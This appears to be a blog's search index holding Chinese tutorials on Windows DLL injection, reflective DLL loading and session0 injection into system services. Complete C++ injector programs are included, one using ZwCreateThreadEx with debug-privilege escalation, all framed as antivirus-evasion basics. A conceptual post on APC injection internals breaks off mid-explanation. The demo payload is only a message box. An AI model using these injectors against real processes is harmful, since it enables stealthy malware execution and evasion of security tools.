<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>dll注入与session0注入</title>
    <url>/2023/08/31/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<center>本篇主要介绍传统的dll注入,反射dll以及利用内核API的session0注入</center>

<span id="more"></span>

<h1 id="传统dll注入"><a href="#传统dll注入" class="headerlink" title="传统dll注入"></a>传统dll注入</h1><p>所谓dll注入就是将一个dll(动态链接库)加载到要被注入的进程的内存空间，使其成为进程的一部分。</p>
<h2 id="1-dll注入步骤"><a href="#1-dll注入步骤" class="headerlink" title="1.dll注入步骤"></a>1.dll注入步骤</h2><p>传统的dll注入大致可以分为以下几个步骤：</p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>所用API</th>
</tr>
</thead>
<tbody><tr>
<td>打开要注入的进程</td>
<td>OpenProcess</td>
</tr>
<tr>
<td>在进程的内存中申请内存空间</td>
<td>virtualAllocEx</td>
</tr>
<tr>
<td>写入内存</td>
<td>writeProcessMemory</td>
</tr>
<tr>
<td>从kenrel32.dll中获取LoadLibrary</td>
<td>GetProcAddress</td>
</tr>
<tr>
<td>创建远程线程加载dll</td>
<td>CreateRemoteThread</td>
</tr>
<tr>
<td>等待线程函数结束</td>
<td>WaitForSingleObject</td>
</tr>
<tr>
<td>释放dll空间</td>
<td>VirtualFreeEx</td>
</tr>
<tr>
<td>关闭句柄</td>
<td>CloseHandle</td>
</tr>
</tbody></table>
<h2 id="2-代码实践"><a href="#2-代码实践" class="headerlink" title="2.代码实践"></a>2.代码实践</h2><p>目标：通过dll注入使加载notepad时弹出消息框，显示“dll注入成功”。</p>
<p>首先在vs中创建一个dll项目，dll代码如下图所示</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230831124516436.png" alt="image-20230831124516436"></p>
<p>创建一个用于注入dll的(中转)程序</p>
<p>代码如下(使用c++)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;tchar.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&lt;TlHelp32.h&gt;//CreateToolhelp32Snapshot在此头文件中,获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br><span class="line">DWORD GetProcessPID(LPCTSTR lpProcessName) &#123;</span><br><span class="line">    DWORD Ret = 0;</span><br><span class="line">    PROCESSENTRY32 p32;//描述获取快照时驻留在系统地址空间中的进程的列表中的条目</span><br><span class="line">    HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//如果函数失败，它将返回 INVALID_HANDLE_VALUE</span><br><span class="line">    //TH32CS_SNAPPROCESS包括系统快照中的所有进程</span><br><span class="line">    if (lpSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        printf(&quot;获取进程快照失败，error:%d&quot;, ::GetLastError());</span><br><span class="line">        return Ret;</span><br><span class="line">    &#125;</span><br><span class="line">    p32.dwSize = sizeof(PROCESSENTRY32);</span><br><span class="line">    ::Process32First(lpSnapshot,&amp;p32); //检索有关系统快照中遇到的第一个进程的信息。</span><br><span class="line">    do &#123;</span><br><span class="line">        if (!lstrcmp(p32.szExeFile, lpProcessName)) &#123;</span><br><span class="line">            Ret = p32.th32ProcessID;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while (::Process32Next(lpSnapshot, &amp;p32));</span><br><span class="line">    ::CloseHandle(lpSnapshot);</span><br><span class="line">    return Ret;</span><br><span class="line">&#125;</span><br><span class="line">//dll注入的主要过程实现函数</span><br><span class="line">DWORD RemoteThreadInject(DWORD pid, LPCWSTR DllName) &#123;</span><br><span class="line">    DWORD size = 0;</span><br><span class="line">    DWORD DllAddr = 0;</span><br><span class="line">    //1.打开进程</span><br><span class="line">    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    if (hprocess == NULL) &#123;</span><br><span class="line">        printf(&quot;OpenProcess error!\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //2.计算dll路径长度</span><br><span class="line">    size = (wcslen(DllName) + 1) * sizeof(TCHAR);</span><br><span class="line">    //申请空间</span><br><span class="line">    LPVOID pAllocMemory = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    //MEM_COMMIT 从指定保留内存页的磁盘的总内存大小和分页文件分配内存费用。 函数还保证当调用方稍后最初访问内存时，内容将为零。 除非实际访问虚拟地址，否则不会分配实际物理页面。</span><br><span class="line">    //PAGE_READWRITE 内存保护选项</span><br><span class="line">    if (pAllocMemory == NULL) &#123;</span><br><span class="line">        printf(&quot;申请内存空间失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //3.写入内存</span><br><span class="line">    BOOL write = WriteProcessMemory(hprocess, pAllocMemory, DllName, size, NULL);</span><br><span class="line">    if (pAllocMemory == 0) &#123;</span><br><span class="line">        printf(&quot;写入内存失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //4.从kenrel32.dll中获取LoadLibrary</span><br><span class="line">    FARPROC pThread = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);</span><br><span class="line">    //GetProcAddress返回值是导出的函数或变量的地址</span><br><span class="line">    LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)pThread;</span><br><span class="line">    //LPTHREAD_START_ROUTINE是一个指向已经开始执行的代码的指针</span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hprocess, NULL, 0, addr, pAllocMemory, 0, NULL);</span><br><span class="line">    if (hThread == NULL) &#123;</span><br><span class="line">        printf(&quot;创建线程失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //6.等待线程结束</span><br><span class="line">    WaitForSingleObject(hThread, -1);//-1为直到线程结束才停止</span><br><span class="line">    //7.释放DLL空间</span><br><span class="line">    VirtualFreeEx(hprocess, pAllocMemory, size, MEM_DECOMMIT);</span><br><span class="line">    //8.关闭句柄</span><br><span class="line">    CloseHandle(hprocess);</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">int wmain(int argc,wchar_t* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    if (argc != 3) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;参数数量不对\n&quot;;</span><br><span class="line">        std::cout &lt;&lt; &quot;格式为DLLInject.exe &lt;被注入进程名&gt; &lt;DLL路径&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD PID = GetProcessPID(argv[1]);</span><br><span class="line">    if (PID == 0) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;不存在该进程\n&quot;;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    RemoteThreadInject(PID, argv[2]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将dll与中转程序放入虚拟机运行。用cmd.exe运行中转程序，传入中转程序名，进程名以及dll名。</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230831135621279.png" alt="image-20230831135621279"></p>
<p>成功！</p>
<p>但是传统DLL注入会遇到如下问题：</p>
<p>1.CreateRemoteThread为用户态API,没用权限注入系统服务进程。</p>
<p>2.需要使用LoadLibrary向进程中注入，容易被查杀。</p>
<p>对于第一个问题我们可以使用session0注入的方式调用ZwCreateThreadEx的方式解决。</p>
<p>对于第二个问题我们可以采用下面所说的反射DLL。</p>
<h1 id="反射dll"><a href="#反射dll" class="headerlink" title="反射dll"></a>反射dll</h1><p>反射型dll注入使用ReflectiveLoader代替LoadLibrary,从而避免了向进程注册DLL模块。</p>
<h2 id="1-反射DLL的注入流程"><a href="#1-反射DLL的注入流程" class="headerlink" title="1.反射DLL的注入流程"></a>1.反射DLL的注入流程</h2><p>1.获取被注入进程未解析的dll基地址。</p>
<p>2.获取必要的dll句柄和函数为修复导入表做准备。</p>
<p>3.将DLL文件头写入内存。</p>
<p>4.通过解析区块表将每个区块写入内存。</p>
<p>3.修复导入表和重定向表。</p>
<p>4.调用DLLMain函数的入口点。</p>
<h2 id="2-代码实现与解析"><a href="#2-代码实现与解析" class="headerlink" title="2.代码实现与解析"></a>2.代码实现与解析</h2><p>具体实现代码可以参照下面的项目以及一位大佬的讲解。</p>
<p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/599022106">https://zhuanlan.zhihu.com/p/599022106</a></p>
<h1 id="session0注入"><a href="#session0注入" class="headerlink" title="session0注入"></a>session0注入</h1><p>在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的。该会话就叫做Session 0。在介绍session0注入之前，我们先介绍以下两个概念。</p>
<h2 id="1-未导出API与未文档化API"><a href="#1-未导出API与未文档化API" class="headerlink" title="1.未导出API与未文档化API"></a>1.未导出API与未文档化API</h2><p>未导出API:在0环里实现。但是没有从dll导出，3环程序无法使用，不能用GetProAccess获取。可以使用特征码匹配来获取。</p>
<p>未文档化API:没有写入开发文档，在DLL里面能够看到，但是不知道参数，无法直接用，可以查找逆向内核的大佬的网站来查看参数，定义结构，用GetProAccess获取。</p>
<h2 id="2-session0注入的原理"><a href="#2-session0注入的原理" class="headerlink" title="2.session0注入的原理"></a>2.session0注入的原理</h2><p>session0注入就是利用了ZwCreateThreadEx这个未文档化API,实现了注入系统服务进程的功能。ZwCreateThreadEx 函数可以突破SESSION 0 隔离，将DLL注入到SESSION 0 隔离的系统服务进程中，CreateRemoteThread 注入系统进程会失败的原因是因为调用 ZwCreateThreadEx 创建远程线程时，第七个参数 CreateThreadFlags 为1。这样 会导致线程创建完成后一直挂起无法恢复进程运行，导致注入失败。</p>
<p>注：感兴趣的友友可以自己用ida以及0环windbg调试器追踪CreateRemoteThread以及CreateThread的调用。</p>
<h2 id="3-session0注入的步骤"><a href="#3-session0注入的步骤" class="headerlink" title="3.session0注入的步骤"></a>3.session0注入的步骤</h2><p>1.打开注入进程，获取进程句柄</p>
<p>2.在注入的进程申请内存地址</p>
<p>3.写入内存地址</p>
<p>4.获取LoadLibraryA函数地址</p>
<p>5.加载ntdll</p>
<p>6.获取ZwCreateThreadEx函数地址</p>
<p>7.使用 ZwCreateThreadEx 创建远线程，实现 DLL 注入</p>
<p>8.关闭句柄</p>
<p>注意：session0函数的重点必须拿到 SE_PRIVILEGE_ENABLED 权限，所以需要提权</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessPID</span><span class="params">(<span class="type">char</span>* lpProcessName)</span> </span>&#123;</span><br><span class="line">    DWORD Ret = <span class="number">0</span>;</span><br><span class="line">    tagPROCESSENTRY32 p32;</span><br><span class="line">    HANDLE lpSnapshot = ::<span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (lpSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;获取进程快照失败，error:%d&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> Ret;</span><br><span class="line">    &#125;</span><br><span class="line">    p32.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    ::<span class="built_in">Process32First</span>(lpSnapshot, &amp;p32);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">lstrcmpA</span>(p32.szExeFile, lpProcessName)) &#123;</span><br><span class="line">            Ret = p32.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (::<span class="built_in">Process32Next</span>(lpSnapshot, &amp;p32));</span><br><span class="line">    ::<span class="built_in">CloseHandle</span>(lpSnapshot);</span><br><span class="line">    <span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//提权函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    BOOL fok = FALSE;</span><br><span class="line">    <span class="comment">//OpenProcessToken 函数打开与进程关联的访问令牌。</span></span><br><span class="line">    <span class="comment">//第二个参数指定一个 访问掩码，该掩码 指定访问令牌的请求访问类型</span></span><br><span class="line">    <span class="comment">//OKEN_ADJUST_PRIVILEGES	启用或禁用访问令牌中的特权所必需的。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))&#123;</span><br><span class="line">        <span class="comment">//TOKEN_PRIVILEGES 结构包含有关访问令牌的一组特权的信息。</span></span><br><span class="line">        <span class="comment">//每个结构都包含特权的 LUID 和属性</span></span><br><span class="line">        TOKEN_PRIVILEGES tp;</span><br><span class="line">        tp.PrivilegeCount = <span class="number">1</span>;<span class="comment">//这必须设置为 Privileges 数组中的条目数</span></span><br><span class="line">        <span class="comment">//LookupPrivilegeValue 函数检索本地唯一标识符 (LUID) 指定系统上用于本地表示指定特权名称。</span></span><br><span class="line">        <span class="comment">//第二个参数该字符串指定权限的名称</span></span><br><span class="line">        <span class="comment">//第三个参数指向一个变量的指针，该变量接收 LUID</span></span><br><span class="line">        <span class="comment">//E_DEBUG_NAME 调试和调整另一个帐户拥有的进程内存所必需的。</span></span><br><span class="line">        <span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">        <span class="comment">//SE_PRIVILEGE_ENABLED 权限已启用。</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">        <span class="comment">//AdjustTokenPrivileges 函数启用或禁用指定访问令牌中的特权</span></span><br><span class="line">        <span class="comment">//第一个参数访问令牌的句柄，其中包含要修改的权限。 句柄必须具有对令牌TOKEN_ADJUST_PRIVILEGES访问权限</span></span><br><span class="line">        <span class="comment">//第二参数指定函数是否禁用令牌的所有特权。 如果此值为 TRUE，则函数将禁用所有特权并忽略 NewState 参数。 如果为 FALSE，则函数根据第三个参数 参数指向的信息修改权限。</span></span><br><span class="line">        <span class="comment">//第三个参数指向 TOKEN_PRIVILEGES 结构的指针，该结构指定特权数组及其属性</span></span><br><span class="line">        <span class="comment">//第四个参数指定第三个参数指向的缓冲区的大小（以字节为单位）</span></span><br><span class="line">        <span class="comment">//第五个参数指向函数用 TOKEN_PRIVILEGES 结构填充的缓冲区的指针，该结构包含函数修改的任何特权的先前状态</span></span><br><span class="line">        <span class="comment">//第六个参数指向变量的指针，该变量接收第五个参数指向的缓冲区的所需大小（以字节为单位）</span></span><br><span class="line">        <span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        fok = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">ZwCreateThreadExInject</span><span class="params">(DWORD PID, <span class="type">const</span> <span class="type">char</span>* pszDllFileName)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">EnableDebugPrivilege</span>();</span><br><span class="line">    HANDLE hRemoteThread;</span><br><span class="line">    DWORD dwStatus = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, PID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;打开进程失败,error:&quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="built_in">lstrlenA</span>(pszDllFileName) + <span class="number">1</span>;</span><br><span class="line">    LPVOID pDllAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pDllAddr) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;申请内存空间失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteProcessMemory</span>(hProcess, pDllAddr, pszDllFileName, dwSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;写入内存失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HMODULE hNtdllDll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hNtdllDll) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;加载ntdll.dll失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FARPROC pFuncProcAddr = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="comment">//网上找的ZwCreateThreadEx的参数形式</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64 </span></span><br><span class="line">     <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">     PHANDLE ThreadHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">     ACCESS_MASK DesiredAccess, </span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">     HANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">     LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">     ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">     SIZE_T ZeroBits, SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">     SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID pUnkown)</span></span>;</span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">        PHANDLE ThreadHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">        ACCESS_MASK DesiredAccess, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID ObjectAttributes, </span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPTHREAD_START_ROUTINE lpStartAddress, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID lpParameter, </span></span></span><br><span class="line"><span class="params"><span class="function">        BOOL CreateSuspended, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dwStackSize, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw1, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw2, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx=(typedef_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;获取ZwCreateThreadEx失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;参数数量不对\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;格式为session0注入.exe &lt;被注入进程名&gt; &lt;DLL路径&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> PID= <span class="built_in">GetProcessPID</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">ZwCreateThreadExInject</span>(PID, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>放入虚拟机，用cmd.exe运行，得到如图</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230901202310296.png" alt="image-20230901202310296"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>刚开始写博客，哪里有错误或者写的不好的地方欢迎各位大佬指出！感谢，后续会有更多免杀内容分享！</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>APC注入</title>
    <url>/2023/09/12/APC%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>APC即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。由于线程是不能被杀掉，挂起，恢复的，线程在执行时会占据CPU，而APC注入可以改变一个线程的行为，可用于DLL注入。</p>
<span id="more"></span>

<h1 id="一、APC机制"><a href="#一、APC机制" class="headerlink" title="一、APC机制"></a>一、APC机制</h1><h2 id="1-1APC调用的条件"><a href="#1-1APC调用的条件" class="headerlink" title="1.1APC调用的条件"></a>1.1APC调用的条件</h2><p>​		往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数，APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC。这里介绍一下应用程序的APC，APC是往线程中插入一个回调函数,但是用的APC调用这个回调函数是有条</p>
<p>件的。</p>
<p>​		当用户模式 APC 排队时，它排队的线程不会被定向到调用 APC 函数，除非它处于可警告状态。线程在调用SleepEx、SignalObjectAndWait，MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx或WaitForSingleObjectEx函数时进入可警告状态。如果在 APC 排队之前等待满足，则线程不再处于可警告等待状态，因此不会执行 APC 函数。但是，APC 仍在排队，因此当线程调用另一个可警告的等待函数时，APC 函数将被执行。</p>
<h2 id="1-2QueueUserAPC函数"><a href="#1-2QueueUserAPC函数" class="headerlink" title="1.2QueueUserAPC函数"></a>1.2QueueUserAPC函数</h2><p>QueueUserAPC用于添加制定的异步函数调用(回调函数)到执行的线程的APC队列中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD QueueUserAPC( PAPCFUNCpfnAPC, // APC function,执行函数地址</span><br><span class="line">					HANDLEhThread, // handle to thread，插入APC的线程句柄，句柄必须包含THREAD_SET_CONTEXT 访问权限。</span><br><span class="line">                    ULONG_PTRdwData // APC function parameter，第三个参数表示传递给执行函数的参数</span><br><span class="line">                    );</span><br></pre></td></tr></table></figure>

<h2 id="1-3APC队列"><a href="#1-3APC队列" class="headerlink" title="1.3APC队列"></a>1.3APC队列</h2><p>APC是针对具体线程，由具体线程加以执行的，所以每个线程都有自己的APC队列。内核中代表着线程的数据结构是ETHREAD，而ETHREAD中的第一个成分Tcb 是KTHREAD数据结构，线程的APC队列就在KTHREAD里面。</p>
<p>KTHREAD + 0x34 处是一个 _KAPC_STATE 结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">...</span><br><span class="line">+0x034 ApcState         : _KAPC_STATE</span><br></pre></td></tr></table></figure>

<p>_KAPC_STATE的结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KAPC_STATE </span><br><span class="line">nt!_KAPC_STATE </span><br><span class="line">+0x000 ApcListHead //2个APC队列 用户APC和内核APC</span><br><span class="line">+0x010 Process //线程所属或者所挂靠的进程</span><br><span class="line">+0x014 KernelApcInProgress //内核APC是否正在执行</span><br><span class="line">+0x015 KernelApcPending //是否有正在等待执行的内核APC</span><br><span class="line">+0x016 UserApcPending //是否有正在等待执行的用户APC</span><br><span class="line"></span><br><span class="line">用户APC：APC函数地址位于用户空间，在用户空间执行</span><br><span class="line"></span><br><span class="line">内核APC：APC函数地址位于内核空间，在内核空间执行（分为NormalRoutine为NULL的SpecialKernelApc和不为NULL的NormalKernelApc。SpecialKernelApc只执行KernelRoutine，IRQL为APC_LEVEL，而NormalKernelApc不仅仅执行 KernelRoutine还执行NormalRoutine，在PASSIVE_LEVEL下执行NormalRoutine。）</span><br></pre></td></tr></table></figure>

<p>NormalRoutine 会找到你提供的APC函数，并不完全等于APC函数的地址。</p>
<h2 id="1-4APC函数执行流程"><a href="#1-4APC函数执行流程" class="headerlink" title="1.4APC函数执行流程"></a>1.4APC函数执行流程</h2><h3 id="1-4-1相关函数"><a href="#1-4-1相关函数" class="headerlink" title="1.4.1相关函数"></a>1.4.1相关函数</h3><p>KiServiceExit函数：这个函数是系统调用、异常或中断返回用户空间的必经之路。</p>
<p>KiDeliverApc函数：负责执行APC函数</p>
<h3 id="1-4-2QueueUserApc"><a href="#1-4-2QueueUserApc" class="headerlink" title="1.4.2QueueUserApc"></a>1.4.2QueueUserApc</h3><p>(1)通过3环的QueueUserApc函数可以完成将APC插入到队列的操作，首先调用了 ntdll.dll 的 NtQueueApcThread。</p>
<p>(2)然后通过 0xB4 的调用号进入ring0。在windbg里面对应的内核函数为 NtQueueApcThread。</p>
<p>(3)然后在 ntosknl.exe 里面定位到 NtQueueApcThread.</p>
<p>(4)最后是调用 KeInitializeApc(对KAPC结构体进行初始化) 和 KeInsertQueueApc 这两个函数来实现APC的效果。</p>
<h3 id="1-4-3用户APC"><a href="#1-4-3用户APC" class="headerlink" title="1.4.3用户APC"></a>1.4.3用户APC</h3><p>当产生系统调用、中断或者异常，线程在返回用户空间前都会调用 KiServiceExit 函数，在KiServiceExit 会判断是否有要执行的用户APC，如果有则调用KiDeliverApc 函数(第一个参数为1)进行处理。涉及的换栈操作如下：</p>
<p>（1）当线程从用户层进入内核层时，要保留原来的运行环境，比如各种寄存器，栈的位置等等( _Trap_Frame )，然后切换成内核的堆栈，如果正常返回，恢复堆栈环境即可。用来保存原始环境的数据结构为SavedApcState。</p>
<p>（2）但如果有用户APC要执行的话，就意味着线程要提前返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到其他的位置，每处理一个用户APC都会涉及到：内核–&gt;用户空间–&gt;再回到内核空间。</p>
<p>线程进0环时，原来的运行环境(寄存器栈顶等)保存到 _Trap_Frame 结构体中，如果要提前返回3环去处理用户APC，就必须要修改 _Trap_Frame 结构体。处理完APC后该如何返回原来的位置？</p>
<p>KiInitializeUserApc 要做的第一件事就是备份，将原来 _Trap_Frame 的值备份到一个新的结构体中( CONTEXT )，这个功能由其子函数KeContextFromKframes 来完成。具体操作如下:</p>
